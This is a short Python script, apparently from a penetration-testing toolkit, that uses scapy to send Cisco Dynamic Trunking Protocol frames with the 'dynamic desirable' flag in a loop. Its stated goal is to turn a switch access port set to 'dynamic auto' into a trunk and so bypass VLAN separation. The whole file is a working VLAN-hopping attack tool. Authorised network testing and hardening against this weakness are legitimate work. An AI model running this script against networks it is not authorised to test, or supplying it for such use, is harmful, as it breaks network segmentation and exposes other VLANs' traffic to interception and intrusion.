#!/usr/bin/env python3

"""
Negotiate a trunk port via Dynamic Trunking Protocol (DTP).

Cisco's DTP can be used to negotiate a trunk port when the switch port
is in 'dynamic auto' mode. This can effectively bypass VLAN separation.

The script sends DTP frames with the 'dynamic desirable' flag so the
switch might reconfigure an access port in 'dynamic auto' mode to a
trunk port.
"""

import argparse
import sys

try:
    from scapy.all import LLC, SNAP, Dot3, get_if_hwaddr, sendp
    from scapy.contrib.dtp import DTP, DTPDomain, DTPNeighbor, DTPStatus, DTPType
except ModuleNotFoundError:
    print("Error: Missing dependency scapy", file=sys.stderr)
    sys.exit(1)


def main():
    argparser = argparse.ArgumentParser(description="Negotiate a trunk port via Dynamic Trunking Protocol (DTP)")
    argparser.add_argument("iface", help="network interface to negotiate trunk port on")
    args = argparser.parse_args()
    print("Sending DTP frames with 'dynamic desirable' flag...")
    try:
        negotiate_trunk(args.iface)
    except PermissionError as e:
        print("Error: You probably need root permissions.", e, file=sys.stderr)


def negotiate_trunk(iface):
    mymac = get_if_hwaddr(iface)
    p = Dot3(src=mymac, dst="01:00:0c:cc:cc:cc") / LLC()
    p /= SNAP()
    p /= DTP(tlvlist=[DTPDomain(), DTPStatus(status=b"\x03"), DTPType(), DTPNeighbor(neighbor=mymac)])
    sendp(p, iface=iface, loop=1, inter=10)


if __name__ == "__main__":
    main()
